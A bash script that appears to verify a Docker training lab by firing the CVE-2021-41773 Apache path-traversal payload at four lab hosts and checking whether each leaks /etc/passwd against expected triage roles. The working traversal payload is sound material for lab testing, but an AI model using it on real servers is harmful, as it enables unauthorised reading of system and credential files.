#!/usr/bin/env bash
set -uo pipefail
cd "$(dirname "$0")/.."

echo "== Containers =="
docker compose ps
echo

echo "== Exploit check (CVE-2021-41773 via /icons/ traversal) =="
PAYLOAD="/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

check () {
  local name="$1" ip="$2" expect="$3"
  result=$(docker exec observateur curl -s -m 5 --path-as-is "http://$ip$PAYLOAD" 2>/dev/null | head -1)
  if echo "$result" | grep -q "root:x:0:0"; then
    status="LEAKS /etc/passwd"
  elif [ -z "$result" ]; then
    status="unreachable / no response"
  else
    status="blocked (no leak)"
  fi
  printf "  %-16s %-14s expected: %-26s got: %s\n" "$name" "$ip" "$expect" "$status"
}

check "web-front-01"   172.20.0.10 "LEAKS (role: urgent)"
check "web-legacy-01"  172.20.0.11 "blocked (role: a documenter)"
check "web-patched-01" 172.20.0.12 "blocked (role: aucune action)"
check "app-01"         172.21.0.10 "unreachable (role: a planifier)"
echo
echo "If every line's 'got' matches its 'expected', the lab is correctly running."
